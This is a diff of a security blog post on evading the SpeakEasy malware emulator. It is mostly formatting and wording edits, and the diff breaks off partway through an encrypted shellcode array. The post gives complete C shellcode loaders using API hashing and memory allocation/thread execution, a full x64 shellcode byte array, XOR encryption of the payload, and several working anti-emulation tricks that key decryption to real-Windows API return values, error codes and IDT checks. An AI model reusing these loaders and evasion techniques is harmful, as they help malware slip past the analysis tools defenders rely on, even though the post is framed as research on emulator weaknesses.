@@ -18,15 +18,15 @@ Avoiding paraphrasing what SpeakEasy is, here is the official statement from the
 
 ![whatispeakeasy](/posts/bypassingspeakeasy/whatisspeakeasy.png)
 
-Since this will not be a tutorial of how to use SpeakEasy or a general overview of it, you can read more about it and how it is used in the battlefield in [here](https://cloud.google.com/blog/topics/threat-intelligence/emulation-of-malicious-shellcode-with-speakeasy/). More or less though, SpeakEasy contains hooks for WINAPI's, that when called, it emulates their behavior and monitors the activity of the emulated sample.
+Since this will not be a tutorial of how to use SpeakEasy or a general overview of it, you can read more about it and how it is used in the battlefield in [here](https://cloud.google.com/blog/topics/threat-intelligence/emulation-of-malicious-shellcode-with-speakeasy/). More or less though, SpeakEasy contains hooks for WINAPIs, that when called, it emulates their behavior and monitors the activity of the emulated sample.
 
-While its very useful in tasks such as helping with automatic [api hash](https://connar.github.io/posts/apihashing/) resolution (solving the api hashing technique), its reliance on python based api hooks, introduces a problem. Because it does not run a real windows kernel, certain low-level artifacts, specifically registry hives and hardware specific data structures, are often either static or entirely ommited. These omissions then create detectable "fingerprints" that can be identified and bypassed on runtime.  
+While its very useful in tasks such as helping with automatic [api hash](https://connar.github.io/posts/apihashing/) resolution (solving the API hashing technique), its reliance on python based API hooks, introduces a problem. Because it does not run a real windows kernel, certain low-level artifacts, specifically registry hives and hardware specific data structures, are often either static or entirely ommited. These omissions then create detectable "fingerprints" that can be identified and bypassed on runtime.  
 
-To get an idea of a limitation of SpeakEasy - without spoiling too much since we will see the limitations and their weaponization onwards - we can go through the example of unsupported WINAPI's. SpeakEasy uses apihooks for **some** WINAPI's. For example, here is a hook for `HeapAlloc`:  
+To get an idea of a limitation of SpeakEasy - without spoiling too much since we will see the limitations and their weaponization onwards - we can go through the example of unsupported WINAPIs. SpeakEasy uses apihooks for **some** WINAPIs. For example, here is a hook for `HeapAlloc`:  
 
 ![heapallochook](/posts/bypassingspeakeasy/heapallochook.png)
 
-If `HeapAlloc` is called, the hook of it will be triggered to emulate the same logic. The problem is that Windows has a ton of WINAPI's and SpeakEasy does not contain all of them. Actually, it does not contain **most** of them (see section *Finding unsupported winapis*). Someone could take advantage of that, find what winapis are unsupported and call them. This would make SpeakEasy crash. More specifically, it would lead to *Unsupported API: [name of API]*.  
+If `HeapAlloc` is called, the hook of it will be triggered to emulate the same logic. The problem is that Windows has a ton of WINAPIs and SpeakEasy does not contain all of them. Actually, it does not contain **most** of them (see section *Finding unsupported WINAPIs*). Someone could take advantage of that, find what WINAPIs are unsupported and call them. This would make SpeakEasy crash. More specifically, it would lead to *Unsupported API: [name of API]*.  
 There is a solution of solving this by creating a hook for that API, but you can already imagine how time costly that is if you have a ton of unsupported API's in the sample you are trying to emulate. You can read more about it on section *[Bypassing Unsupported APIs](https://cloud.google.com/blog/topics/threat-intelligence/using-speakeasy-emulation-framework-programmatically-to-unpack-malware)* of this article.
 
 
@@ -37,7 +37,7 @@ This is just one of the many ways we can bypass SpeakEasy, which we will also be
 Without further a due, let's begin. 
 
 ## Our template and a demo of SpeakEasy
-The PoC we will be developing and modifying will be a `.c` template implementing API Hashing. The main WINAPI's we will be using will be `VirtualAlloc`, `VirtualProtect`, `CreateThread` and `WaitForSingleObject` in order to execute shellcode. The shellcode will simply be launching the calculator app.
+The PoC we will be developing and modifying will be a `.c` template implementing API Hashing. The main WINAPIs we will be using will be `VirtualAlloc`, `VirtualProtect`, `CreateThread` and `WaitForSingleObject` in order to execute shellcode. The shellcode will simply be launching the calculator app.
 
 ```c
 #include <windows.h>
@@ -100,8 +100,9 @@ typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD
 typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);
 
 /// x64 shellcode for launching calc
-unsigned char buf[] = 
-"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00";
+unsigned char buf[] = {
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x00
+};
 
 // The hashing algorithm. It is the add_65599.py - you can find it in hashdb by oalabs
 uint32_t hash(const unsigned char* data, size_t len) {
@@ -154,8 +155,6 @@ void* ResolveApi(uint32_t targetHash) {
 
 // Entry point
 void WINAPI EntryPoint(void) {
-    // Reserve shadow space for x64 calls
-    __asm__("sub $0x28, %rsp");
 
     uint32_t h_VirtualAlloc = 0x5ACFDE4A;
     uint32_t h_VirtualProtect = 0x208602E4;
@@ -185,7 +184,6 @@ void WINAPI EntryPoint(void) {
         }
     }
 
-    __asm__("add $0x28, %rsp");
     ExitProcess(0);
 }
 ```
@@ -214,9 +212,9 @@ Our goal will be to bypass SpeakEasy with various techniques. **In some of them*
 Let's now move into the bypasses.
 
 ## Technique 1: Unsupported APIs
-The first way to defeat SpeakEasy is to find try and locate WINAPI's that are not yet implemented. As it was mentioned previously, because SpeakEasy is not a full OS, every single Windows API must be manually implemented in Python. If the malware calls an api that isn't implemented, SpeakEasy doesn't know how to handle the stack or return values, which causes it to crash.
+The first way to defeat SpeakEasy is to find try and locate WINAPIs that are not yet implemented. As it was mentioned previously, because SpeakEasy is not a full OS, every single Windows API must be manually implemented in Python. If the malware calls an API that isn't implemented, SpeakEasy doesn't know how to handle the stack or return values, which causes it to crash.
 
-### Finding unsupported WINAPI's
+### Finding unsupported WINAPIs
 I wrote a Python script to automate the discovery of this limitation. It crawls the SpeakEasy `usermode` source code for `@apihook` decorators (used to declare a windows API function) and compares that list against the actual Export Address Table (EAT) of real Windows DLLs:
 ```py
 import os
@@ -317,10 +315,12 @@ wtsapi32       .dll | Missing 68
 ```
 Like Ash Ketchum would have said if he was a malware analyst:  
 
-![cantimplementemall](/posts/bypassingspeakeasy/cantimplementemall.png)
+<div align="center">
+  <img src="/posts/bypassingspeakeasy/cantimplementemall.png" alt="cant-implement-em-all">
+</div>
 
-#### Unsupported WINAPI's - Triggering a crash via calling
-We can make our python script more informative to print the unsupported WINAPI's. One such API is the `CreateJobObjectW`. Let's take the following template:
+#### Unsupported WINAPIs - Triggering a crash
+We can make our python script more informative to print the unsupported WINAPIs. One such API is the `CreateJobObjectW`. Let's take the following template:
 ```c
 #include <windows.h>
 #include <stdint.h>
@@ -336,7 +336,9 @@ typedef BOOL   (WINAPI *PfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
 typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);
 
-unsigned char buf[] = "\xfc\x48\x83...";
+unsigned char buf[] = {
+    0xfc, 0x48, 0x83, ...
+};
 
 uint32_t hash(const unsigned char* data, size_t len) {
     ...
@@ -388,13 +390,13 @@ Unsupported API: KERNEL32.CreateJobObjectW (ret: 0x140001285)
 * Finished emulating
 ```
 
-We could also make it more difficult such as storing the expected return value of this api and comparing it with what `CreateJobObjectW` returns, just in case an analyst writes a dummy hook for it to make it still exit and not proceed with emulation. *The expected return value will be weaponized later in the environmental key encryption I mentioned in the beginning*.
+We could also make it more difficult such as storing the expected return value of this API and comparing it with what `CreateJobObjectW` returns, just in case an analyst writes a dummy hook for it to make it still exit and not proceed with emulation. *The expected return value will be weaponized later in the environmental key encryption I mentioned in the beginning*.
 
-#### Unsupported WINAPI's - Triggering a crash via compiling
+#### Unsupported WINAPIs - Triggering a crash via compiling
 
-Another way we could lead to the same emulation failure is via compiler instrumentation, which basically means compile our program using toolchains such as MSVC, where the compiler prepends a et of startup routines used to initialize the C runtime (CRT). These routines invoke fiber local storage (FLS) functions such as `FlsAlloc`, `FlsGetValue` and `FlsSetValue` to manage thread-related data. Since SpeakEasy is a py-based usermode emulator, the issue comes again to having the need of a "mock" implementation for every system call.
+Another way we could lead to the same emulation failure is via compiler instrumentation, which basically means compile our program using toolchains such as MSVC, where the compiler prepends a set of startup routines used to initialize the C runtime (CRT). These routines invoke fiber local storage (FLS) functions such as `FlsAlloc`, `FlsGetValue` and `FlsSetValue` to manage thread-related data. Since SpeakEasy is a py-based usermode emulator, the issue comes again to having the need of a "mock" implementation for every system call.
 
-To compile this time, we will need to launch `x64 Native Tools Command Prompt for VS 2022` (at least I am using the 2022 version) and the compile command to run is:
+To compile this time, we will need to launch `x64 Native Tools Command Prompt for VS 2022` (at least I am using the 2022 version) by running:  
 ```
 cl.exe /Fe:crtbypass.exe crtbypass.c /link /subsystem:console
 ```
@@ -405,20 +407,22 @@ We can then compare the output from emulating it with Speakeasy versus running i
 
 ,which leads to a crash of `Unsupported API: kernel32.FlsGetValue2 (ret: 0x140006127)`.
 
-The difference between the `MSVC` (VS Code) approach and the `MinGW` approach (the previous way of compilation) comes down to how much additional info the compiler adds to our code. The `MSVC` approach includes the microsoft C runtime (CRT). Instead of having our code as the starting point, it sets a function called `mainCRTStartup` as the start. So, before our Entrypoint, it calls a number of functions to set up things like thread handling and security cookies (one of them is the `FlsGetValue2`).  
+The difference between the `MSVC` (*from VS Code*) approach and the `MinGW` approach (*the previous way of compilation*) comes down to how much additional info the compiler adds to our code. The `MSVC` approach includes the microsoft C runtime (CRT). Instead of having our code as the starting point, it sets a function called `mainCRTStartup` as the start. So, before our Entrypoint, it calls a number of functions to set up things like thread handling and security cookies (one of them is the `FlsGetValue2`).  
 The `MinGW` approach just compiles our code without adding any additional functions and dependencies.
 
 > For the rest of the PoC's, we will be using the MinGW approach since `MSVC` will be crashing SpeakEasy every time.
 
 #### The Analyst's Solution (Dummy Hooking)
-[Mandiant suggests](https://cloud.google.com/blog/topics/threat-intelligence/using-speakeasy-emulation-framework-programmatically-to-unpack-malware) that if an API isn't critical for unpacking, an analyst can add a dummy api hook that simply returns `0` to keep emulation going. 
+[Mandiant suggests](https://cloud.google.com/blog/topics/threat-intelligence/using-speakeasy-emulation-framework-programmatically-to-unpack-malware) that if an API isn't critical for unpacking, an analyst can add a dummy API hook that simply returns `0` to keep emulation going. 
 
 ![madiants google blog](/posts/bypassingspeakeasy/cloudgooglecom.png)
 
 This is where the second way of bypassing - `Variant of MITRE T1480.001` - comes into place.
 
 #### Weaponizing the Fix (MITRE T1480.001 - Environmental Keying)
-The technique I will be implementing is inspired from the `Environmental Keying (MITRE T1480.001)`, but the objective is different. In `T480.001`, system values are used as keys (for example [Volume Serial Numbers](https://cloud.google.com/blog/topics/threat-intelligence/lowkey-hunting-missing-volume-serial-id)) to ensure a payload runs only on a specific target. In the technique we will be developing, we weaponize the return value of an unsupported or in general an API as our encryption / decryption key. We will call API's and use their expected return value on real windows as the key, so even if an analyst attempts to write a dummy apihook that returns a generic value such as 0 (as their blog suggested), they end up providing the wrong key and thus, the emulation will fail.
+The technique I will be implementing is inspired from the `Environmental Keying (MITRE T1480.001)`, but the objective is different.  
+
+In `T480.001`, system values are used as keys (for example [Volume Serial Numbers](https://cloud.google.com/blog/topics/threat-intelligence/lowkey-hunting-missing-volume-serial-id)) to ensure a payload runs only on a specific target. In the technique we will be developing, we weaponize the expected return value of APIs (*and the expected system behavior*) to create an **encryption/decryption oracle**. We will call API's and use their expected return value on real windows as the key, so even if an analyst attempts to write a dummy apihook that returns a generic value such as 0 (as their blog suggested), they end up providing the wrong key and thus, the emulation will fail.
 
 To get an idea of Environmental Keying, you can read through the MITRE page, but more or less, here are some examples:
 | Malware Family / Group | Keying Technique | Relation to emulation bypass
@@ -491,8 +495,9 @@ typedef HANDLE (WINAPI *PfnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD
 typedef DWORD  (WINAPI *PfnWaitForSingleObject)(HANDLE, DWORD);
 typedef HANDLE (WINAPI *PfnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 
-unsigned char buf[] = 
-"\xfc\x48\x83...";
+unsigned char buf[] = {
+    0xfc, 0x48, 0x83, ...
+};
 
 uint32_t hash(const unsigned char* data, size_t len) {
     ...
@@ -503,7 +508,6 @@ void* ResolveApi(uint32_t targetHash) {
 }
 
 void WINAPI EntryPoint(void) {
-    __asm__("sub $0x28, %rsp");
 
     uint32_t h_VirtualAlloc = 0x5ACFDE4A;
     uint32_t h_VirtualProtect = 0x208602E4;
@@ -541,7 +545,6 @@ void WINAPI EntryPoint(void) {
         }
     }
 
-    __asm__("add $0x28, %rsp");
     ExitProcess(0);
 }
 ```
@@ -565,7 +568,7 @@ Compiling our template with this technique, we will see that indeed SpeakEasy wi
 But in normal windows, it will launch the calc app.
 
 **What happens behind the scenes**:  
-When the malware executes `pCreateFileA`, the underlying CPU engine (Unicorn) attempts to fetch an instruction from an unmapped memory address (the API hook range). Speakeasy's core dispatcher in winemu.py catches this and begins the resolution process.
+When the malware executes `pCreateFileA`, the underlying CPU engine (Unicorn) attempts to fetch an instruction from an unmapped memory address (the API hook range). Speakeasy's core dispatcher in winemu.py catches this and begins the resolution process.  
 
 File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1141)
 ```py
@@ -585,7 +588,7 @@ def handle_import_func(self, dll, name):
             rv = self.api.call_api_func(mod, func, argv, ctx=default_ctx)
 ```
 
-The execution is bridged through winapi.py, which acts as the caller for the specific Python hook. The func variable here is a direct reference to the CreateFile method in kernel32.py.
+The execution is bridged through winapi.py, which acts as the caller for the specific Python hook. The func variable here is a direct reference to the CreateFile method in kernel32.py.  
 
 File: [winapi.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/winenv/api/winapi.py#L73)
 ```py
@@ -597,7 +600,8 @@ def call_api_func(self, mod, func, argv, ctx):
     return func(mod, self.emu, argv, ctx)
 ```
 
-Inside the hook, Speakeasy identifies that the file is missing and that the user requested OPEN_EXISTING. It correctly sets the Windows error code, but then triggers a fateful call to the FileManager to "open" the file anyway to maintain emulation continuity.
+Inside the hook, Speakeasy identifies that the file is missing and that the user requested OPEN_EXISTING. It correctly sets the Windows error code, but then triggers a fateful call to the FileManager to "open" the file anyway to maintain emulation continuity.  
+
 File: [kernel32.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/winenv/api/usermode/kernel32.py#L3450)
 ```py
 @apihook('CreateFile', argc=7)
@@ -620,7 +624,8 @@ def CreateFile(self, emu, argv, ctx={}):
     return hnd
 ```
 
-This is the critical failure point. Even though the file is missing and the hook correctly returns the value of `ERROR_FILE_NOT_FOUND`, the FileManager attempts to "repair" the call by creating a dummy File object. The generated handle is pulled from a hardcoded class variable: 0x80.
+This is the critical failure point. Even though the file is missing and the hook correctly returns the value of `ERROR_FILE_NOT_FOUND`, the FileManager attempts to "repair" the call by creating a dummy File object. The generated handle is pulled from a hardcoded class variable: 0x80.  
+
 File: [fileman.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/fileman.py#L69)
 ```py
 class File(object):
@@ -638,7 +643,8 @@ def get_handle(self):
     return hfile
 ```
 
-The value `0x80` is returned back through the call stack. The variable `rv` in `winemu.py` now contains `0x80` instead of the original `-1`. Speakeasy immediately logs this mutated value, which is why we see the successful return in the console output.
+The value `0x80` is returned back through the call stack. The variable `rv` in `winemu.py` now contains `0x80` instead of the original `-1`. Speakeasy immediately logs this mutated value, which is why we see the successful return in the console output.  
+
 File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1193)
 ```py
 # rv now contains 0x80
@@ -648,7 +654,8 @@ self.log_api(oret, imp_api, rv, argv)
 
 After that point, SpeakEasy commits the result to the emulated CPU registers. Because the engine returned a valid handle (the hardcoded 0x80 handle), the engine treats the call as successful.
 
-This triggers a post-hook cleanup that synchronizes the Thread Environment Block (TEB), effectively overwriting the 0x2 error set in kernel32.py with 0x0 (ERROR_SUCCESS).
+This triggers a post-hook cleanup that synchronizes the Thread Environment Block (TEB), effectively overwriting the 0x2 error set in kernel32.py with 0x0 (ERROR_SUCCESS).  
+
 File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1195)
 ```py
 if not self.run_complete and ret == oret and pc == opc:
@@ -656,7 +663,8 @@ if not self.run_complete and ret == oret and pc == opc:
     self.do_call_return(argc, ret, rv, conv=conv)
 ```
 
-So when our sample calls `GetLastError()`, instead of `2`, we get `0` because we got a successful returned handle to the file (that does not exist).
+So when our sample calls `GetLastError()`, instead of `2`, we get `0` because we got a successful returned handle to the file (that does not exist).  
+
 File: [kernel32.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/winenv/api/usermode/kernel32.py#L1443)
 ```py
 @apihook('GetLastError', argc=0)
@@ -721,7 +729,10 @@ void* ResolveApi(uint32_t targetHash, DWORD key) {
 }
 
 void WINAPI EntryPoint(void) {
-    __asm__("sub $0x28, %rsp");
+
+    unsigned char buf[] = {
+    0xfc, 0x48, 0x83, ...
+};
 
     // Pre-XOR'd hashes with 0x2 (The expected Error Code)
     uint32_t masked_VirtualAlloc    = 0x5ACFDE48;
@@ -767,7 +778,6 @@ void WINAPI EntryPoint(void) {
         }
     }
 
-    __asm__("add $0x28, %rsp");
     ExitProcess(0);
 }
 ```
@@ -782,7 +792,7 @@ Running SpeakEasy on the sample yields incorrect emulation:
 * Finished emulating
 ```
 
-This evasion technique exploits the Perfectionist's Paradox: Speakeasy is so determined to ensure the malware's 'success' and 'continuity' that it breaks the very rules of the operating system it is trying to emulate. By proactively fixing a failure to keep the sample running, the emulator creates a state of 'impossible perfection'-a valid handle for a non-existent file-which the malware can detect as a clear sign of simulation.
+This evasion technique exploits the Perfectionist's Paradox. Speakeasy is trying to ensure the malware's success and continuity that it "breaks" the rules of the operating system it is trying to emulate. By  fixing a failure to keep the sample running, the emulator creates a state of impossible perfection - a valid handle for a non-existent file - which the malware can detect as a clear sign of simulation and weaponize it.
 
 
 ##### Weaponizing IDT Check
@@ -805,27 +815,20 @@ void PrintString(const char* str) {
 void WINAPI EntryPoint(void) {
     IDTR idtr;
     char buffer[128];
-    
-    __asm__("sub $0x28, %rsp");
 
-    // Execute SIDT
     __asm__("sidt %0" : "=m"(idtr));
 
-    // Format the output manually using WinAPI
-    // We use %I64x for the 64-bit base address
     wsprintfA(buffer, "IDT Limit: 0x%x\nIDT Base:  0x%I64x\n", 
               (UINT)idtr.limit, 
               idtr.base);
 
     PrintString(buffer);
 
-    // Also exit with the limit so it shows in Speakeasy's logs
-    __asm__("add $0x28, %rsp");
     ExitProcess((UINT)idtr.limit);
 }
 ```
 
-In real windows, the output is:
+By compiling with `x86_64-w64-mingw32-gcc -o poc.exe idtpoc.c -m64 -nostdlib -nostartfiles -Wl,-e,EntryPoint -lkernel32 -luser32 -ladvapi32`, in real windows, the output is:
 ```
 >poc.exe
 IDT Limit: 0xfff
@@ -953,19 +956,19 @@ typedef DWORD (WINAPI *PfnGetCurrentProcessId)(void);
 typedef HANDLE (WINAPI *PfnGetCurrentProcess)(void);
 typedef ATOM (WINAPI *PfnGlobalFindAtomA)(LPCSTR);
 
-unsigned char buf[] = 
-"\xfc\x48\x83...";
+unsigned char buf[] = {
+    0xfc, 0x48, 0x83, ...
+};
 
 uint32_t hash(const unsigned char* data, size_t len) {
-    ...
+    // ...
 }
 
 void* ResolveApi(uint32_t targetHash) {
-    ...
+   // ...
 }
 
 void WINAPI EntryPoint(void) {
-    __asm__("sub $0x28, %rsp");
 
     uint32_t h_GetCurrentProcessId = 0x4DA08B07;
     uint32_t h_GetCurrentProcess   = 0x6A6E16CC;
@@ -1015,7 +1018,6 @@ void WINAPI EntryPoint(void) {
         }
     }
 
-    __asm__("add $0x28, %rsp");
     ExitProcess(0);
 }
 ```
@@ -1037,12 +1039,9 @@ And the emulation never reached the resolution of the hashes:
 
 On the other hand, if we used a single WinAPI call (for example `GetCurrentProcessId`), we would get a more verbose result:
 ```c
-...
+// ...
 
 void EntryPoint() {
-    __asm__("and $-16, %rsp");
-    __asm__("sub $0x40, %rsp");
-
     PfnGetCurrentProcessId pPID = (PfnGetCurrentProcessId)ResolveApi(0x4DA08B07);
 
     if (pPID) {
@@ -1083,7 +1082,8 @@ SpeakEasy's output:
 * Finished emulating
 ```
 
-Searching for this message in SpeakEasy's source code, we see that indeed a limit is set.
+Searching for this message in SpeakEasy's source code, we see that indeed a limit is set.  
+
 File: [winemu.py](https://github.com/mandiant/speakeasy/blob/master/speakeasy/windows/winemu.py#L1236)
 ```py
 run = self.get_current_run()
@@ -1302,8 +1302,6 @@ void RawPrintHex(PfnWriteConsoleA pWrite, HANDLE hOut, const char* label, uint32
 }
 
 void WINAPI EntryPoint(void) {
-    __asm__("and $-16, %rsp");
-    __asm__("sub $0x80, %rsp");
 
     PfnWriteConsoleA pWrite = (PfnWriteConsoleA)ResolveApi(0xFB6EDD29, 0); 
     PfnGetStdHandle pGetStd = (PfnGetStdHandle)ResolveApi(0x6B3A8F15, 0);
@@ -1411,10 +1409,10 @@ def xor_encrypt(data, key):
     return encrypted
 
 def format_c_array(name, data):
-    hex_data = [f"\\x{b:02x}" for b in data]
-    chunked = [hex_data[i:i+15] for i in range(0, len(hex_data), 15)]
-    formatted = '    "' + '"\n    "'.join(["".join(chunk) for chunk in chunked]) + '";'
-    return f"unsigned char {name}[] = \n{formatted}"
+    hex_data = [f"0x{b:02x}" for b in data]
+    chunked = [hex_data[i:i+12] for i in range(0, len(hex_data), 12)]
+    formatted_body = ",\n    ".join([", ".join(chunk) for chunk in chunked])
+    return f"unsigned char {name}[] = {{\n    {formatted_body}\n}};"
 
 encrypted_shellcode = xor_encrypt(original_shellcode, master_key)
 
@@ -1426,26 +1424,31 @@ And like this, we copied the encrypted shellcode into our template:
 ```
 └─$ python get_enc_shellcode.py
 MasterKey: 0xf07ec6f3
-unsigned char encrypted_buf[] = 
-    "\x0f\x8e\xfd\x14\x03\x2e\xbe\xf0\xf3\xc6\x3f\xa1\xb2\x96\x2c"
-    "\xa1\xa5\x8e\x4f\x22\x96\x8e\xf5\xa2\x93\x8e\xf5\xa2\xeb\x8e"
-    "\xf5\xa2\xd3\x8e\xf5\x82\xa3\x8e\x71\x47\xb9\x8c\x33\xc1\x3a"
-    "\x8e\x4f\x30\x5f\xfa\x1f\x8c\xf1\xea\x5e\xb1\x32\x0f\x73\xb1"
-    "\xf2\x07\x9c\x1d\xa1\x87\x2f\xb8\x78\x94\x5e\x7b\xb1\xfa\x36"
-    "\xf1\x23\x4d\xfe\x78\xf3\xc6\x7e\xb8\x76\x06\x0a\x97\xbb\xc7"
-    "\xae\xa0\x78\x8e\x66\xb4\x78\x86\x5e\xb9\xf2\x16\x9d\xa6\xbb"
-    "\x39\xb7\xb1\x78\xf2\xf6\xb8\xf2\x10\x33\xc1\x3a\x8e\x4f\x30"
-    "\x5f\x87\xbf\x39\xfe\x87\x7f\x31\xcb\x26\x0b\x01\xbf\xc5\x32"
-    "\xd4\xfb\x83\x47\x21\x86\x1e\x26\xb4\x78\x86\x5a\xb9\xf2\x16"
-    "\x18\xb1\x78\xca\x36\xb4\x78\x86\x62\xb9\xf2\x16\x3f\x7b\xf7"
-    "\x4e\x36\xf1\x23\x87\x26\xb1\xab\x98\x27\xaa\xb2\x9e\x3f\xa9"
-    "\xb2\x9c\x36\x73\x1f\xe6\x3f\xa2\x0c\x26\x26\xb1\xaa\x9c\x36"
-    "\x7b\xe1\x2f\x29\x0f\x0c\x39\x23\xb8\x49\xc7\x7e\xf0\xf3\xc6"
-    "\x7e\xf0\xf3\x8e\xf3\x7d\xf2\xc7\x7e\xf0\xb2\x7c\x4f\x7b\x9c"
-    "\x41\x81\x25\x48\x26\x63\xda\xf9\x87\xc4\x56\x66\x7b\xe3\x0f"
-    "\x26\x8e\xfd\x34\xdb\xfa\x78\x8c\xf9\x46\x85\x10\x86\xc3\xc5"
-    "\xb7\xe0\xb4\x11\x9a\xf3\x9f\x3f\x79\x29\x39\xab\x93\x92\xaa"
-    "\x1d\xf0";
+unsigned char encrypted_buf[] = {
+    0x0f, 0x8e, 0xfd, 0x14, 0x03, 0x2e, 0xbe, 0xf0, 0xf3, 0xc6, 0x3f, 0xa1,
+    0xb2, 0x96, 0x2c, 0xa1, 0xa5, 0x8e, 0x4f, 0x22, 0x96, 0x8e, 0xf5, 0xa2,
+    0x93, 0x8e, 0xf5, 0xa2, 0xeb, 0x8e, 0xf5, 0xa2, 0xd3, 0x8e, 0xf5, 0x82,
+    0xa3, 0x8e, 0x71, 0x47, 0xb9, 0x8c, 0x33, 0xc1, 0x3a, 0x8e, 0x4f, 0x30,
+    0x5f, 0xfa, 0x1f, 0x8c, 0xf1, 0xea, 0x5e, 0xb1, 0x32, 0x0f, 0x73, 0xb1,
+    0xf2, 0x07, 0x9c, 0x1d, 0xa1, 0x87, 0x2f, 0xb8, 0x78, 0x94, 0x5e, 0x7b,
+    0xb1, 0xfa, 0x36, 0xf1, 0x23, 0x4d, 0xfe, 0x78, 0xf3, 0xc6, 0x7e, 0xb8,
+    0x76, 0x06, 0x0a, 0x97, 0xbb, 0xc7, 0xae, 0xa0, 0x78, 0x8e, 0x66, 0xb4,
+    0x78, 0x86, 0x5e, 0xb9, 0xf2, 0x16, 0x9d, 0xa6, 0xbb, 0x39, 0xb7, 0xb1,
